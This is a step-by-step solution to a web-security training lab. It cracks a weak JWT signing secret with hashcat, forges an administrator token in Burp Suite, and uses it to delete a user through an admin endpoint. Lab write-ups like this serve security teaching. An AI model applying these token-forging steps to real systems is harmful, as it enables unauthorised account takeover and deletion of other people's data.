Solution:

1. Install the JWT Editor extension from the Burp BApp Store.
2. Log in using:
   wiener:peter
3. In Burp → Proxy → HTTP history, find the:
   GET /my-account
   request.
4. Send the request to Burp Repeater.
5. Change the path to:
   GET /admin
6. Copy the JWT from the request.
7. Run Hashcat:
   hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
8. If needed, use:
   hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list --show
9. The secret key is:
   secret1
10. In Burp Decoder, Base64-encode:
    secret1
11. Go to the JWT Editor Keys tab and click New Symmetric Key.
12. Click Generate, then replace the value of the k property with the Base64-encoded secret.
13. Click OK to save the key.
14. Return to the GET /admin request in Burp Repeater.
15. Open the JSON Web Token message editor.
16. Change the sub claim to:
    "sub": "administrator"
17. Click Sign and select the generated symmetric key.
18. Make sure Don't modify header is selected, then click OK.
19. Send the request to:
    GET /admin
20. Find the delete endpoint:
    /admin/delete?username=carlos
21. Send a request to:
    GET /admin/delete?username=carlos
22. The lab is solved.
